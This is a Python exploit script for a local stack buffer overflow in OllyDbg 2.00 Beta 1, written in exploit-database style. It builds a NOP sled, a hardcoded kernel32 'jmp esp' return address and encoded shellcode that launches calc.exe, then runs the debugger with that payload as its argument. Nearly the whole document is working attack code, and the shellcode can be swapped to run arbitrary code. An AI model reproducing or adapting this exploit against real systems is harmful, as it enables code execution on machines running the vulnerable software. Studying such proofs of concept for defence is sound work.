# Exploit Title: [Ollydbg 2.00 Beta1 Local Buffer Overflow Exploit]
# Date: [2010-02-15]
# Author: [_SuBz3r0_]
# Software Link: [http://www.ollydbg.de/version2.html]
# Version: [2.00 Beta 1]
# Tested on: [XP SP3]
# CVE : [if exists]
# Code :
#Ollydbg2 v2.00 beta1 Exploit in Python
print ""
print "##############################################"
print "# _SuBz3r0_ #"
print "##############################################"
print ""
print "Ollydbg v2.00 beta 1 local overflow Exploit"
print "Just For Fun"
print "exploit = [NOP] + [jmp ESP] + [SH3LLC0DE]"
print "Shellcode = calc.exe"
print ""
print "Greetz:piloo le canari & MaX"
print "Tested on: French Windows Xp Sp3 fully Patched"
print ""

import os
import sys

#path to ollydbg.exe
program = 'c:\\ollydbg.exe'

#exploit = [NOP] + [jmp ESP] + [SH3LLC0DE]
#overflow =786*'\x90'
#eip = "\x13\x44\x87\x7c" : kernel32.dll jmp esp
#Shellcode pop up calc.exe
exploit =786*'\x90'+'\x13'+'\x44'+'\x87'+'\x7c'+''.join([
'\xb4\x31\xf8\x2d\x84\xe3\x04\x35\xb8\x3c\x14\x46\x34\x48',
'\x67\xfc\x31\xc9\x83\xe9\xe2\xe8\xff\xff\xff\xff\xc0\x5e',
'\x81\x76\x0e\x03\xf9\xd8\x37\x83\xee\xfc\xe2\xf4\xff\x11',
'\x9c\x37\x03\xf9\x53\x72\x3f\x72\xa4\x32\x7b\xf8\x37\xbc',
'\x4c\xe1\x53\x68\x23\xf8\x33\x7e\x88\xcd\x53\x36\xed\xc8',
'\x18\xae\xaf\x7d\x18\x43\x04\x38\x12\x3a\x02\x3b\x33\xc3',
'\x38\xad\xfc\x33\x76\x1c\x53\x68\x27\xf8\x33\x51\x88\xf5',
'\x93\xbc\x5c\xe5\xd9\xdc\x88\xe5\x53\x36\xe8\x70\x84\x13',
'\x07\x3a\x87\x06\xf5\x99\x8e\x53\x88\xbf\xe8\xbc\x43\xf5',
'\x53\x47\x1f\x54\x53\x5f\x0b\x70\x20\xb4\xc3\x93\x88\x5f',
'\xf3\x73\xdc\x68\x6b\x61\x26\xbd\x0d\xae\x27\xd0\x60\x98',
'\xb4\x54\x03\xf9\xd8\x37'])

print ""
os.execl(program,program,program,exploit)